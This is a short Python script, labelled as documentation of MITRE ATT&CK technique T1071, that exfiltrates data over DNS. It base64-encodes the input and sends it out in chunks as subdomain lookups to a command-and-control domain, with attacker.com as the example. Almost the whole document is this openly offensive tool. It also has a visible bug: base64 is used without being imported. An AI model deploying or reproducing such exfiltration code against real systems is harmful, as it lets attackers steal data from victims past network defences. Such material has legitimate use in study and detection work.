# < ---- DOCUMENTATION OF MITRE ATT&CK TECHNIQUE ---- >
# T1071: Application Layer Protocol (Generic)
# Objective: Using common protocols (HTTP, DNS, SMB) for C2.

#!/usr/bin/env python3
import socket
import argparse

def dns_c2_exfiltrate(domain, data):
    encoded_data = base64.b64encode(data.encode()).decode()
    chunk_size = 63  # Max DNS label length
    for i in range(0, len(encoded_data), chunk_size):
        chunk = encoded_data[i:i+chunk_size]
        subdomain = f"{chunk}.{domain}"
        try:
            socket.gethostbyname(subdomain)  # DNS query
            print(f"[+] Exfiltrated chunk: {chunk}")
        except Exception as ex:
            print(f"[-] Failed to exfiltrate chunk: {ex}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="T1071: DNS C2 Exfiltration")
    parser.add_argument("--domain", required=True, help="C2 domain (e.g., attacker.com)")
    parser.add_argument("--data", required=True, help="Data to exfiltrate")
    args = parser.parse_args()
    dns_c2_exfiltrate(args.domain, args.data)